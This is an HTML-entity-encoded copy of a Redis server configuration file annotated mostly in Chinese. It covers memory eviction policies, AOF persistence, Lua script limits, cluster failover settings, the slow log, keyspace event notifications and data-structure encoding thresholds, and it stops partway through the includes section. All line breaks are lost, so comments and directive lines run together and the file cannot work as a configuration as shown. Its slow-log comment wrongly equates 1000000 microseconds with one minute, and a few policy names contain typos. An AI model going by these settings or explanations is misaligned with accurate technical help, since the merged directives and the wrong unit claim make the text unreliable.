&#x6CE8;&#x610F;&#xFF1A;Redis&#x65B0;&#x7684;vm&#x673A;&#x5236;&#xFF0C;&#x4F1A;&#x628A;Key&#x5B58;&#x653E;&#x5185;&#x5B58;&#xFF0C;Value&#x4F1A;&#x5B58;&#x653E;&#x5728;swap&#x533A;## maxmemory&#x7684;&#x8BBE;&#x7F6E;&#x6BD4;&#x8F83;&#x9002;&#x5408;&#x4E8E;&#x628A;redis&#x5F53;&#x4F5C;&#x4E8E;&#x7C7B;&#x4F3C;memcached&#x7684;&#x7F13;&#x5B58;&#x6765;&#x4F7F;&#x7528;&#xFF0C;&#x800C;&#x4E0D;&#x9002;&#x5408;&#x5F53;&#x505A;&#x4E00;&#x4E2A;&#x771F;&#x5B9E;&#x7684;DB&#x3002;# &#x5F53;&#x628A;Redis&#x5F53;&#x505A;&#x4E00;&#x4E2A;&#x771F;&#x5B9E;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4F7F;&#x7528;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x5C06;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x5927;&#x7684;&#x5F00;&#x9500;# maxmemory &lt;bytes&gt; # &#x5F53;&#x5185;&#x5B58;&#x8FBE;&#x5230;&#x6700;&#x5927;&#x503C;&#x7684;&#x65F6;&#x5019;Redis&#x4F1A;&#x9009;&#x62E9;&#x5220;&#x9664;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#xFF1F;&#x6709;&#x4E94;&#x79CD;&#x65B9;&#x5F0F;&#x53EF;&#x4F9B;&#x9009;&#x62E9;# # volatile-lru -&gt; &#x5229;&#x7528;LRU&#x7B97;&#x6CD5;&#x79FB;&#x9664;&#x8BBE;&#x7F6E;&#x8FC7;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;key (LRU:&#x6700;&#x8FD1;&#x4F7F;&#x7528; Least Recently Used )# allkeys-lru -&gt; &#x5229;&#x7528;LRU&#x7B97;&#x6CD5;&#x79FB;&#x9664;&#x4EFB;&#x4F55;key# volatile-random -&gt; &#x79FB;&#x9664;&#x8BBE;&#x7F6E;&#x8FC7;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;&#x968F;&#x673A;key# allkeys-&gt;random -&gt; remove a random key, any key# volatile-ttl -&gt; &#x79FB;&#x9664;&#x5373;&#x5C06;&#x8FC7;&#x671F;&#x7684;key(minor TTL)# noeviction -&gt; &#x4E0D;&#x79FB;&#x9664;&#x4EFB;&#x4F55;&#x53EF;&#x4EE5;&#xFF0C;&#x53EA;&#x662F;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5199;&#x9519;&#x8BEF;# # &#x6CE8;&#x610F;&#xFF1A;&#x5BF9;&#x4E8E;&#x4E0A;&#x9762;&#x7684;&#x7B56;&#x7565;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5408;&#x9002;&#x7684;key&#x53EF;&#x4EE5;&#x79FB;&#x9664;&#xFF0C;&#x5F53;&#x5199;&#x7684;&#x65F6;&#x5019;Redis&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;## &#x5199;&#x547D;&#x4EE4;&#x5305;&#x62EC;: set setnx setex append# incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd# sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby# zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby# getset mset msetnx exec sort## &#x9ED8;&#x8BA4;&#x662F;:## maxmemory-policy volatile-lru # LRU &#x548C; minimal TTL &#x7B97;&#x6CD5;&#x90FD;&#x4E0D;&#x662F;&#x7CBE;&#x51C6;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x4F46;&#x662F;&#x76F8;&#x5BF9;&#x7CBE;&#x786E;&#x7684;&#x7B97;&#x6CD5;(&#x4E3A;&#x4E86;&#x8282;&#x7701;&#x5185;&#x5B58;)&#xFF0C;&#x968F;&#x610F;&#x4F60;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x6837;&#x672C;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x68C0;&#x6D4B;&#x3002;# Redis&#x9ED8;&#x8BA4;&#x7684;&#x7070;&#x9009;&#x62E9;3&#x4E2A;&#x6837;&#x672C;&#x8FDB;&#x884C;&#x68C0;&#x6D4B;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;maxmemory-samples&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;## maxmemory-samples 3#################################### AOF #################################### # &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;redis&#x4F1A;&#x5728;&#x540E;&#x53F0;&#x5F02;&#x6B65;&#x7684;&#x628A;&#x6570;&#x636E;&#x5E93;&#x955C;&#x50CF;&#x5907;&#x4EFD;&#x5230;&#x78C1;&#x76D8;&#xFF0C;&#x4F46;&#x662F;&#x8BE5;&#x5907;&#x4EFD;&#x662F;&#x975E;&#x5E38;&#x8017;&#x65F6;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x5907;&#x4EFD;&#x4E5F;&#x4E0D;&#x80FD;&#x5F88;&#x9891;&#x7E41;&#xFF0C;&#x5982;&#x679C;&#x53D1;&#x751F;&#x8BF8;&#x5982;&#x62C9;&#x95F8;&#x9650;&#x7535;&#x3001;&#x62D4;&#x63D2;&#x5934;&#x7B49;&#x72B6;&#x51B5;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;&#x9020;&#x6210;&#x6BD4;&#x8F83;&#x5927;&#x8303;&#x56F4;&#x7684;&#x6570;&#x636E;&#x4E22;&#x5931;&#x3002;# &#x6240;&#x4EE5;redis&#x63D0;&#x4F9B;&#x4E86;&#x53E6;&#x5916;&#x4E00;&#x79CD;&#x66F4;&#x52A0;&#x9AD8;&#x6548;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5907;&#x4EFD;&#x53CA;&#x707E;&#x96BE;&#x6062;&#x590D;&#x65B9;&#x5F0F;&#x3002;# &#x5F00;&#x542F;append only&#x6A21;&#x5F0F;&#x4E4B;&#x540E;&#xFF0C;redis&#x4F1A;&#x628A;&#x6240;&#x63A5;&#x6536;&#x5230;&#x7684;&#x6BCF;&#x4E00;&#x6B21;&#x5199;&#x64CD;&#x4F5C;&#x8BF7;&#x6C42;&#x90FD;&#x8FFD;&#x52A0;&#x5230;appendonly.aof&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x5F53;redis&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x65F6;&#xFF0C;&#x4F1A;&#x4ECE;&#x8BE5;&#x6587;&#x4EF6;&#x6062;&#x590D;&#x51FA;&#x4E4B;&#x524D;&#x7684;&#x72B6;&#x6001;&#x3002;# &#x4F46;&#x662F;&#x8FD9;&#x6837;&#x4F1A;&#x9020;&#x6210;appendonly.aof&#x6587;&#x4EF6;&#x8FC7;&#x5927;&#xFF0C;&#x6240;&#x4EE5;redis&#x8FD8;&#x652F;&#x6301;&#x4E86;BGREWRITEAOF&#x6307;&#x4EE4;&#xFF0C;&#x5BF9;appendonly.aof &#x8FDB;&#x884C;&#x91CD;&#x65B0;&#x6574;&#x7406;&#x3002;# &#x4F60;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x5F00;&#x542F;asynchronous dumps &#x548C; AOF appendonly no # AOF&#x6587;&#x4EF6;&#x540D;&#x79F0; (&#x9ED8;&#x8BA4;: &quot;appendonly.aof&quot;)# appendfilename appendonly.aof # Redis&#x652F;&#x6301;&#x4E09;&#x79CD;&#x540C;&#x6B65;AOF&#x6587;&#x4EF6;&#x7684;&#x7B56;&#x7565;:## no: &#x4E0D;&#x8FDB;&#x884C;&#x540C;&#x6B65;&#xFF0C;&#x7CFB;&#x7EDF;&#x53BB;&#x64CD;&#x4F5C; . Faster.# always: always&#x8868;&#x793A;&#x6BCF;&#x6B21;&#x6709;&#x5199;&#x64CD;&#x4F5C;&#x90FD;&#x8FDB;&#x884C;&#x540C;&#x6B65;. Slow, Safest.# everysec: &#x8868;&#x793A;&#x5BF9;&#x5199;&#x64CD;&#x4F5C;&#x8FDB;&#x884C;&#x7D2F;&#x79EF;&#xFF0C;&#x6BCF;&#x79D2;&#x540C;&#x6B65;&#x4E00;&#x6B21;. Compromise.## &#x9ED8;&#x8BA4;&#x662F;&quot;everysec&quot;&#xFF0C;&#x6309;&#x7167;&#x901F;&#x5EA6;&#x548C;&#x5B89;&#x5168;&#x6298;&#x4E2D;&#x8FD9;&#x662F;&#x6700;&#x597D;&#x7684;&#x3002;# &#x5982;&#x679C;&#x60F3;&#x8BA9;Redis&#x80FD;&#x66F4;&#x9AD8;&#x6548;&#x7684;&#x8FD0;&#x884C;&#xFF0C;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;&quot;no&quot;&#xFF0C;&#x8BA9;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x51B3;&#x5B9A;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x53BB;&#x6267;&#x884C;# &#x6216;&#x8005;&#x76F8;&#x53CD;&#x60F3;&#x8BA9;&#x6570;&#x636E;&#x66F4;&#x5B89;&#x5168;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;&quot;always&quot;## &#x5982;&#x679C;&#x4E0D;&#x786E;&#x5B9A;&#x5C31;&#x7528; &quot;everysec&quot;. # appendfsync alwaysappendfsync everysec# appendfsync no # AOF&#x7B56;&#x7565;&#x8BBE;&#x7F6E;&#x4E3A;always&#x6216;&#x8005;everysec&#x65F6;&#xFF0C;&#x540E;&#x53F0;&#x5904;&#x7406;&#x8FDB;&#x7A0B;(&#x540E;&#x53F0;&#x4FDD;&#x5B58;&#x6216;&#x8005;AOF&#x65E5;&#x5FD7;&#x91CD;&#x5199;)&#x4F1A;&#x6267;&#x884C;&#x5927;&#x91CF;&#x7684;I/O&#x64CD;&#x4F5C;# &#x5728;&#x67D0;&#x4E9B;Linux&#x914D;&#x7F6E;&#x4E2D;&#x4F1A;&#x963B;&#x6B62;&#x8FC7;&#x957F;&#x7684;fsync()&#x8BF7;&#x6C42;&#x3002;&#x6CE8;&#x610F;&#x73B0;&#x5728;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x4FEE;&#x590D;&#xFF0C;&#x5373;&#x4F7F;fsync&#x5728;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x8FDB;&#x884C;&#x5904;&#x7406;## &#x4E3A;&#x4E86;&#x51CF;&#x7F13;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E0B;&#x9762;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;no-appendfsync-on-rewrite## This means that while another child is saving the durability of Redis is# the same as &quot;appendfsync none&quot;, that in pratical terms means that it is# possible to lost up to 30 seconds of log in the worst scenario (with the# default Linux settings).# # If you have latency problems turn this to &quot;yes&quot;. Otherwise leave it as# &quot;no&quot; that is the safest pick from the point of view of durability.no-appendfsync-on-rewrite no # Automatic rewrite of the append only file.# AOF &#x81EA;&#x52A8;&#x91CD;&#x5199;# &#x5F53;AOF&#x6587;&#x4EF6;&#x589E;&#x957F;&#x5230;&#x4E00;&#x5B9A;&#x5927;&#x5C0F;&#x7684;&#x65F6;&#x5019;Redis&#x80FD;&#x591F;&#x8C03;&#x7528; BGREWRITEAOF &#x5BF9;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x91CD;&#x5199; # # &#x5B83;&#x662F;&#x8FD9;&#x6837;&#x5DE5;&#x4F5C;&#x7684;&#xFF1A;Redis&#x4F1A;&#x8BB0;&#x4F4F;&#x4E0A;&#x6B21;&#x8FDB;&#x884C;&#x4E9B;&#x65E5;&#x5FD7;&#x540E;&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;(&#x5982;&#x679C;&#x4ECE;&#x5F00;&#x673A;&#x4EE5;&#x6765;&#x8FD8;&#x6CA1;&#x8FDB;&#x884C;&#x8FC7;&#x91CD;&#x5199;&#xFF0C;&#x90A3;&#x65E5;&#x5B50;&#x5927;&#x5C0F;&#x5728;&#x5F00;&#x673A;&#x7684;&#x65F6;&#x5019;&#x786E;&#x5B9A;)## &#x57FA;&#x7840;&#x5927;&#x5C0F;&#x4F1A;&#x540C;&#x73B0;&#x5728;&#x7684;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#x3002;&#x5982;&#x679C;&#x73B0;&#x5728;&#x7684;&#x5927;&#x5C0F;&#x6BD4;&#x57FA;&#x7840;&#x5927;&#x5C0F;&#x5927;&#x5236;&#x5B9A;&#x7684;&#x767E;&#x5206;&#x6BD4;&#xFF0C;&#x91CD;&#x5199;&#x529F;&#x80FD;&#x5C06;&#x542F;&#x52A8;# &#x540C;&#x65F6;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x6700;&#x5C0F;&#x5927;&#x5C0F;&#x7528;&#x4E8E;AOF&#x91CD;&#x5199;&#xFF0C;&#x8FD9;&#x4E2A;&#x7528;&#x4E8E;&#x963B;&#x6B62;&#x5373;&#x4F7F;&#x6587;&#x4EF6;&#x5F88;&#x5C0F;&#x4F46;&#x662F;&#x589E;&#x957F;&#x5E45;&#x5EA6;&#x5F88;&#x5927;&#x4E5F;&#x53BB;&#x91CD;&#x5199;AOF&#x6587;&#x4EF6;&#x7684;&#x60C5;&#x51B5;# &#x8BBE;&#x7F6E; percentage &#x4E3A;0&#x5C31;&#x5173;&#x95ED;&#x8FD9;&#x4E2A;&#x7279;&#x6027; auto-aof-rewrite-percentage 100auto-aof-rewrite-min-size 64mb############################## LUA SCRIPTING ############################### # Max execution time of a Lua script in milliseconds.## If the maximum execution time is reached Redis will log that a script is# still in execution after the maximum allowed time and will start to# reply to queries with an error.## When a long running script exceed the maximum execution time only the# SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be# used to stop a script that did not yet called write commands. The second# is the only way to shut down the server in the case a write commands was# already issue by the script but the user don&apos;t want to wait for the natural# termination of the script.## Set it to 0 or a negative value for unlimited execution without warnings.lua-time-limit 5000################################ REDIS &#x96C6;&#x7FA4; ################################# &#x542F;&#x7528;&#x6216;&#x505C;&#x7528;&#x96C6;&#x7FA4;# cluster-enabled yes # Every cluster node has a cluster configuration file. This file is not# intended to be edited by hand. It is created and updated by Redis nodes.# Every Redis Cluster node requires a different cluster configuration file.# Make sure that instances running in the same system does not have# overlapping cluster configuration file names.## cluster-config-file nodes-6379.conf # Cluster node timeout is the amount of milliseconds a node must be unreachable # for it to be considered in failure state.# Most other internal time limits are multiple of the node timeout.## cluster-node-timeout 15000 # A slave of a failing master will avoid to start a failover if its data# looks too old.## There is no simple way for a slave to actually have a exact measure of# its &quot;data age&quot;, so the following two checks are performed:## 1) If there are multiple slaves able to failover, they exchange messages# in order to try to give an advantage to the slave with the best# replication offset (more data from the master processed).# Slaves will try to get their rank by offset, and apply to the start# of the failover a delay proportional to their rank.## 2) Every single slave computes the time of the last interaction with# its master. This can be the last ping or command received (if the master# is still in the &quot;connected&quot; state), or the time that elapsed since the# disconnection with the master (if the replication link is currently down).# If the last interaction is too old, the slave will not try to failover# at all.## The point &quot;2&quot; can be tuned by user. Specifically a slave will not perform# the failover if, since the last interaction with the master, the time# elapsed is greater than:## (node-timeout * slave-validity-factor) + repl-ping-slave-period## So for example if node-timeout is 30 seconds, and the slave-validity-factor# is 10, and assuming a default repl-ping-slave-period of 10 seconds, the# slave will not try to failover if it was not able to talk with the master# for longer than 310 seconds.## A large slave-validity-factor may allow slaves with too old data to failover# a master, while a too small value may prevent the cluster from being able to# elect a slave at all.## For maximum availability, it is possible to set the slave-validity-factor# to a value of 0, which means, that slaves will always try to failover the# master regardless of the last time they interacted with the master.# (However they&apos;ll always try to apply a delay proportional to their# offset rank).## Zero is the only value able to guarantee that when all the partitions heal# the cluster will always be able to continue.## cluster-slave-validity-factor 10 # Cluster slaves are able to migrate to orphaned masters, that are masters# that are left without working slaves. This improves the cluster ability# to resist to failures as otherwise an orphaned master can&apos;t be failed over# in case of failure if it has no working slaves.## Slaves migrate to orphaned masters only if there are still at least a# given number of other working slaves for their old master. This number# is the &quot;migration barrier&quot;. A migration barrier of 1 means that a slave# will migrate only if there is at least 1 other working slave for its master# and so forth. It usually reflects the number of slaves you want for every# master in your cluster.## Default is 1 (slaves migrate only if their masters remain with at least# one slave). To disable migration just set it to a very large value.# A value of 0 can be set but is useful only for debugging and dangerous# in production.## cluster-migration-barrier 1 # In order to setup your cluster make sure to read the documentation# available at http://redis.io web site.################################## SLOW LOG ################################### # Redis Slow Log &#x8BB0;&#x5F55;&#x8D85;&#x8FC7;&#x7279;&#x5B9A;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x4E0D;&#x5305;&#x62EC;I/O&#x8BA1;&#x7B97;&#x6BD4;&#x5982;&#x8FDE;&#x63A5;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7B49;&#xFF0C;&#x53EA;&#x662F;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x65F6;&#x95F4;# # &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;slow log&#xFF1A;&#x4E00;&#x4E2A;&#x662F;&#x544A;&#x8BC9;Redis&#x6267;&#x884C;&#x8D85;&#x8FC7;&#x591A;&#x5C11;&#x65F6;&#x95F4;&#x88AB;&#x8BB0;&#x5F55;&#x7684;&#x53C2;&#x6570;slowlog-log-slower-than(&#x5FAE;&#x5999;)&#xFF0C;# &#x53E6;&#x4E00;&#x4E2A;&#x662F;slow log &#x7684;&#x957F;&#x5EA6;&#x3002;&#x5F53;&#x4E00;&#x4E2A;&#x65B0;&#x547D;&#x4EE4;&#x88AB;&#x8BB0;&#x5F55;&#x7684;&#x65F6;&#x5019;&#x6700;&#x65E9;&#x7684;&#x547D;&#x4EE4;&#x5C06;&#x88AB;&#x4ECE;&#x961F;&#x5217;&#x4E2D;&#x79FB;&#x9664; # &#x4E0B;&#x9762;&#x7684;&#x65F6;&#x95F4;&#x4EE5;&#x5FAE;&#x5999;&#x5FAE;&#x5355;&#x4F4D;&#xFF0C;&#x56E0;&#x6B64;1000000&#x4EE3;&#x8868;&#x4E00;&#x5206;&#x949F;&#x3002;# &#x6CE8;&#x610F;&#x5236;&#x5B9A;&#x4E00;&#x4E2A;&#x8D1F;&#x6570;&#x5C06;&#x5173;&#x95ED;&#x6162;&#x65E5;&#x5FD7;&#xFF0C;&#x800C;&#x8BBE;&#x7F6E;&#x4E3A;0&#x5C06;&#x5F3A;&#x5236;&#x6BCF;&#x4E2A;&#x547D;&#x4EE4;&#x90FD;&#x4F1A;&#x8BB0;&#x5F55;slowlog-log-slower-than 10000 # &#x5BF9;&#x65E5;&#x5FD7;&#x957F;&#x5EA6;&#x6CA1;&#x6709;&#x9650;&#x5236;&#xFF0C;&#x53EA;&#x662F;&#x8981;&#x6CE8;&#x610F;&#x5B83;&#x4F1A;&#x6D88;&#x8017;&#x5185;&#x5B58;# &#x53EF;&#x4EE5;&#x901A;&#x8FC7; SLOWLOG RESET &#x56DE;&#x6536;&#x88AB;&#x6162;&#x65E5;&#x5FD7;&#x6D88;&#x8017;&#x7684;&#x5185;&#x5B58;slowlog-max-len 102############################# Event notification ############################## # Redis can notify Pub/Sub clients about events happening in the key space.# This feature is documented at http://redis.io/topics/keyspace-events# # For instance if keyspace events notification is enabled, and a client# performs a DEL operation on key &quot;foo&quot; stored in the Database 0, two# messages will be published via Pub/Sub:## PUBLISH __keyspace@0__:foo del# PUBLISH __keyevent@0__:del foo## It is possible to select the events that Redis will notify among a set# of classes. Every class is identified by a single character:## K Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.# E Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.# g Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...# $ String commands# l List commands# s Set commands# h Hash commands# z Sorted set commands# x Expired events (events generated every time a key expires)# e Evicted events (events generated when a key is evicted for maxmemory)# A Alias for g$lshzxe, so that the &quot;AKE&quot; string means all the events.## The &quot;notify-keyspace-events&quot; takes as argument a string that is composed# by zero or multiple characters. The empty string means that notifications# are disabled at all.## Example: to enable list and generic events, from the point of view of the# event name, use:## notify-keyspace-events Elg## Example 2: to get the stream of the expired keys subscribing to channel# name __keyevent@0__:expired use:## notify-keyspace-events Ex## By default all notifications are disabled because most users don&apos;t need# this feature and the feature has some overhead. Note that if you don&apos;t# specify at least one of K or E, no events will be delivered.notify-keyspace-events &quot;&quot;############################### ADVANCED CONFIG ############################### # &#x5F53;hash&#x4E2D;&#x5305;&#x542B;&#x8D85;&#x8FC7;&#x6307;&#x5B9A;&#x5143;&#x7D20;&#x4E2A;&#x6570;&#x5E76;&#x4E14;&#x6700;&#x5927;&#x7684;&#x5143;&#x7D20;&#x6CA1;&#x6709;&#x8D85;&#x8FC7;&#x4E34;&#x754C;&#x65F6;&#xFF0C;# hash&#x5C06;&#x4EE5;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x7684;&#x7F16;&#x7801;&#x65B9;&#x5F0F;&#xFF08;&#x5927;&#x5927;&#x51CF;&#x5C11;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#xFF09;&#x6765;&#x5B58;&#x50A8;&#xFF0C;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x8FD9;&#x4E24;&#x4E2A;&#x4E34;&#x754C;&#x503C;# Redis Hash&#x5BF9;&#x5E94;Value&#x5185;&#x90E8;&#x5B9E;&#x9645;&#x5C31;&#x662F;&#x4E00;&#x4E2A;HashMap&#xFF0C;&#x5B9E;&#x9645;&#x8FD9;&#x91CC;&#x4F1A;&#x6709;2&#x79CD;&#x4E0D;&#x540C;&#x5B9E;&#x73B0;&#xFF0C;# &#x8FD9;&#x4E2A;Hash&#x7684;&#x6210;&#x5458;&#x6BD4;&#x8F83;&#x5C11;&#x65F6;Redis&#x4E3A;&#x4E86;&#x8282;&#x7701;&#x5185;&#x5B58;&#x4F1A;&#x91C7;&#x7528;&#x7C7B;&#x4F3C;&#x4E00;&#x7EF4;&#x6570;&#x7EC4;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#xFF0C;&#x800C;&#x4E0D;&#x4F1A;&#x91C7;&#x7528;&#x771F;&#x6B63;&#x7684;HashMap&#x7ED3;&#x6784;&#xFF0C;&#x5BF9;&#x5E94;&#x7684;value redisObject&#x7684;encoding&#x4E3A;zipmap,# &#x5F53;&#x6210;&#x5458;&#x6570;&#x91CF;&#x589E;&#x5927;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x8F6C;&#x6210;&#x771F;&#x6B63;&#x7684;HashMap,&#x6B64;&#x65F6;encoding&#x4E3A;ht&#x3002;hash-max-zipmap-entries 512hash-max-zipmap-value 64 # list&#x6570;&#x636E;&#x7C7B;&#x578B;&#x591A;&#x5C11;&#x8282;&#x70B9;&#x4EE5;&#x4E0B;&#x4F1A;&#x91C7;&#x7528;&#x53BB;&#x6307;&#x9488;&#x7684;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;# list&#x6570;&#x636E;&#x7C7B;&#x578B;&#x8282;&#x70B9;&#x503C;&#x5927;&#x5C0F;&#x5C0F;&#x4E8E;&#x591A;&#x5C11;&#x5B57;&#x8282;&#x4F1A;&#x91C7;&#x7528;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;list-max-ziplist-entries 512list-max-ziplist-value 64 # set&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5185;&#x90E8;&#x6570;&#x636E;&#x5982;&#x679C;&#x5168;&#x90E8;&#x662F;&#x6570;&#x503C;&#x578B;&#xFF0C;&#x4E14;&#x5305;&#x542B;&#x591A;&#x5C11;&#x8282;&#x70B9;&#x4EE5;&#x4E0B;&#x4F1A;&#x91C7;&#x7528;&#x7D27;&#x51D1;&#x683C;&#x5F0F;&#x5B58;&#x50A8;&#x3002;set-max-intset-entries 512 # zsort&#x6570;&#x636E;&#x7C7B;&#x578B;&#x591A;&#x5C11;&#x8282;&#x70B9;&#x4EE5;&#x4E0B;&#x4F1A;&#x91C7;&#x7528;&#x53BB;&#x6307;&#x9488;&#x7684;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;# zsort&#x6570;&#x636E;&#x7C7B;&#x578B;&#x8282;&#x70B9;&#x503C;&#x5927;&#x5C0F;&#x5C0F;&#x4E8E;&#x591A;&#x5C11;&#x5B57;&#x8282;&#x4F1A;&#x91C7;&#x7528;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;zset-max-ziplist-entries 128zset-max-ziplist-value 64 # Redis&#x5C06;&#x5728;&#x6BCF;100&#x6BEB;&#x79D2;&#x65F6;&#x4F7F;&#x7528;1&#x6BEB;&#x79D2;&#x7684;CPU&#x65F6;&#x95F4;&#x6765;&#x5BF9;redis&#x7684;hash&#x8868;&#x8FDB;&#x884C;&#x91CD;&#x65B0;hash&#xFF0C;&#x53EF;&#x4EE5;&#x964D;&#x4F4E;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;# # &#x5F53;&#x4F60;&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x6709;&#x975E;&#x5E38;&#x4E25;&#x683C;&#x7684;&#x5B9E;&#x65F6;&#x6027;&#x9700;&#x8981;&#xFF0C;&#x4E0D;&#x80FD;&#x591F;&#x63A5;&#x53D7;Redis&#x65F6;&#x4E0D;&#x65F6;&#x7684;&#x5BF9;&#x8BF7;&#x6C42;&#x6709;2&#x6BEB;&#x79D2;&#x7684;&#x5EF6;&#x8FDF;&#x7684;&#x8BDD;&#xFF0C;&#x628A;&#x8FD9;&#x9879;&#x914D;&#x7F6E;&#x4E3A;no&#x3002;## &#x5982;&#x679C;&#x6CA1;&#x6709;&#x8FD9;&#x4E48;&#x4E25;&#x683C;&#x7684;&#x5B9E;&#x65F6;&#x6027;&#x8981;&#x6C42;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;yes&#xFF0C;&#x4EE5;&#x4FBF;&#x80FD;&#x591F;&#x5C3D;&#x53EF;&#x80FD;&#x5FEB;&#x7684;&#x91CA;&#x653E;&#x5185;&#x5B58;activerehashing yes# HyperLogLog sparse representation bytes limit. The limit includes the# 16 bytes header. When an HyperLogLog using the sparse representation crosses# this limit, it is converted into the dense representation.## A value greater than 16000 is totally useless, since at that point the# dense representation is more memory efficient.# # The suggested value is ~ 3000 in order to have the benefits of# the space efficient encoding without slowing down too much PFADD,# which is O(N) with the sparse encoding. The value can be raised to# ~ 10000 when CPU is not a concern, but space is, and the data set is# composed of many HyperLogLogs with cardinality in the 0 - 15000 range.hll-sparse-max-bytes 3000# The client output buffer limits can be used to force disconnection of clients# that are not reading data from the server fast enough for some reason (a# common reason is that a Pub/Sub client can&apos;t consume messages as fast as the# publisher can produce them).## The limit can be set differently for the three different classes of clients:## normal -&gt; normal clients# slave -&gt; slave clients and MONITOR clients# pubsub -&gt; clients subscribed to at least one pubsub channel or pattern## The syntax of every client-output-buffer-limit directive is the following:## client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;## A client is immediately disconnected once the hard limit is reached, or if# the soft limit is reached and remains reached for the specified number of# seconds (continuously).# So for instance if the hard limit is 32 megabytes and the soft limit is# 16 megabytes / 10 seconds, the client will get disconnected immediately# if the size of the output buffers reach 32 megabytes, but will also get# disconnected if the client reaches 16 megabytes and continuously overcomes# the limit for 10 seconds.## By default normal clients are not limited because they don&apos;t receive data# without asking (in a push way), but just after a request, so only# asynchronous clients may create a scenario where data is requested faster# than it can read.## Instead there is a default limit for pubsub and slave clients, since# subscribers and slaves receive data in a push fashion.## Both the hard or the soft limit can be disabled by setting them to zero.client-output-buffer-limit normal 0 0 0client-output-buffer-limit slave 256mb 64mb 60client-output-buffer-limit pubsub 32mb 8mb 60 # Redis calls an internal function to perform many background tasks, like# closing connections of clients in timeout, purging expired keys that are# never requested, and so forth.## Not all tasks are performed with the same frequency, but Redis checks for# tasks to perform accordingly to the specified &quot;hz&quot; value.## By default &quot;hz&quot; is set to 10. Raising the value will use more CPU when# Redis is idle, but at the same time will make Redis more responsive when# there are many keys expiring at the same time, and timeouts may be# handled with more precision.## The range is between 1 and 500, however a value over 100 is usually not# a good idea. Most users should use the default of 10 and raise this up to# 100 only in environments where very low latency is required.hz 10 # When a child rewrites the AOF file, if the following option is enabled# the file will be fsync-ed every 32 MB of data generated. This is useful# in order to commit the file to the disk more incrementally and avoid# big latency spikes.aof-rewrite-incremental-fsync yes ################################## INCLUDES ################################### # &#x5047;&#x5982;&#x8BF4;&#x4F60;&#x6709;&#x4E00;&#x4E2A;&#x53EF;&#x7528;&#x4E8E;&#x6240;&#x6709;&#x7684; redis server &#x7684;&#x6807;&#x51C6;&#x914D;&#x7F6E;&#x6A21;&#x677F;&#xFF0C;# &#x4F46;&#x9488;&#x5BF9;&#x67D0;&#x4E9B; server 